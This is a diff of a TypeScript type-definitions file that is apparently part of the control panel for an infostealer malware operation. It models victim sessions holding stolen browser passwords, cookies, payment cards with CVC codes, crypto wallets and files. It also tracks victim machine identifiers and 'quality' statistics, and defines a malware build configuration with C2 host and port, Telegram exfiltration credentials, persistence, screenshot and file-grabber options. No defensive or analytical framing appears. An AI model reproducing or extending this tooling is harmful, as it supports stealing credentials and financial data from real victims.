@@ -1,16 +1,35 @@
 export interface LoginRequest { username: string; password: string }
 export interface LoginResponse { token: string; expires_at: string }
 
+export interface CountStats { total: number; today?: number; yesterday?: number; change?: number }
+export interface SessionStats { total: number; today: number; yesterday: number; change: number }
+export interface DuplicateStats { hwid: number; ip: number }
+export interface QualityStats { valid: number; total: number; percentage: number }
+
 export interface StatsResponse {
-  sessions: { total: number; today: number }
-  passwords: { total: number }
-  cookies: { total: number }
-  cards: { total: number }
-  wallets: { total: number }
-  geo: Array<{ country: string; count: number }>
-  browsers: Array<{ name: string; count: number }>
+  sessions: SessionStats
+  passwords: CountStats
+  cookies: CountStats
+  cards: CountStats
+  wallets: CountStats
+  duplicates: DuplicateStats
+  quality: QualityStats
+  countries: number
+  geo: Array<{ country_code: string; count: number }>
+  browsers: Array<{ browser: string; count: number }>
+  os_distribution: Array<{ os: string; count: number }>
   timeline: Array<{ date: string; count: number }>
   top_domains: Array<{ domain: string; count: number }>
+}
+
+export interface SystemHealth {
+  status: string
+  goroutines: number
+  mem_alloc_mb: number
+  mem_sys_mb: number
+  mem_heap_mb: number
+  gc_cycles: number
+  go_version: string
 }
 
 export interface Session {
@@ -21,64 +40,58 @@ export interface Session {
   username?: string
   ip?: string
   country_code?: string
-  passwords_count: number
-  cookies_count: number
-  cards_count: number
-  wallets_count: number
-  files_count: number
   created_at: string
 }
 
 export interface SessionListItem extends Session {
-  duplicate_count?: number
-  viewed?: number
+  passwords_count?: number
+  cookies_count?: number
+  cards_count?: number
+  wallets_count?: number
+  files_count?: number
+  viewed?: boolean
+  browser?: string
 }
 
 export interface SessionDetail extends SessionListItem {
-  viewed?: number
+  passwords: Password[]
+  cookies: Cookie[]
+  cards: Card[]
+  wallets: WalletResponse[]
+  files: StolenFile[]
   system_info?: SystemInfo
-  passwords?: Array<{ id: string; url?: string; username?: string; password_value?: string; browser?: string }>
-  cookies?: Array<{ id: string; domain?: string; name?: string; value?: string; path?: string }>
-  cards?: Array<{ id: string; number?: string; exp_month?: string; exp_year?: string; holder?: string; cvc?: string }>
-  wallets?: Array<{ id: string; name?: string; icon?: string; path?: string }>
-  files?: Array<{ id: string; filename?: string; size?: number }>
 }
+
+export interface Password {
+  id: string; session_id: string; url?: string; username?: string; password_value?: string; browser?: string
+}
+
+export interface Cookie {
+  id: string; session_id: string; domain?: string; name?: string; value?: string; path?: string
+}
+
+export interface Card {
+  id: string; session_id: string; number?: string; exp_month?: string; exp_year?: string; holder?: string; cvc?: string
+}
+
+export interface WalletResponse { id: string; name: string; path: string; icon?: string }
+
+export interface StolenFile { id: string; filename: string; size: number }
 
 export interface SystemInfo {
   cpu?: string; gpu?: string; ram?: string; os?: string; screen?: string
-  hostname?: string; local_ip?: string; mac?: string
+  hostname?: string; local_ip?: string; mac?: string; public_ip?: string; hwid?: string; uptime?: string
 }
 
-export interface WSMessage {
-  type: 'stats_update' | 'new_session' | 'pong'
-  data?: unknown
-}
+export interface WSMessage { type: string; data?: unknown }
 
-export interface PaginatedResponse<T> {
-  data: T[]
-  total: number
-  page: number
-  per_page: number
-}
+export interface PaginatedResponse<T> { items: T[]; total: number; page: number; limit: number; pages: number }
 
-export interface SessionPage {
-  items: SessionListItem[]
-  total: number
-  page: number
-  limit: number
-  pages: number
-}
+export interface SessionPage { sessions: SessionListItem[]; items?: SessionListItem[]; total: number; page: number; limit: number; pages: number }
 
 export interface BuildConfig {
-  c2_host: string
-  c2_port: number
-  telegram_token: string
-  telegram_chat_id: string
-  enable_persistence: boolean
-  enable_screenshot: boolean
-  enable_grabber: boolean
-  include_decryptor: boolean
-  build_tag: string
+  c2_host: string; c2_port: number; telegram_token: string; telegram_chat_id: string
+  enable_persistence: boolean; enable_screenshot: boolean; enable_grabber: boolean; include_decryptor: boolean; build_tag: string
 }
 
 export interface BuildRecord {
@@ -112,22 +125,8 @@ export interface BuildConfig {
   include_decryptor: boolean
 }
 
-export interface BuildResponse {
-  build_id: string
-  file_size: number
-  sha256: string
-}
+export interface BuildResponse { id: string; download_url: string; file_size: number; sha256: string }
 
-export interface ApiError {
-  status: number
-  error: string
-  message?: string
-}
+export interface ApiError { status: number; error: string; message?: string }
 
-export interface Note {
-    id: string
-    session_id: string
-    content: string
-    created_by: string
-    created_at: string
-}
+export interface Note { id: string; session_id: string; content: string; created_by: string; created_at: string }
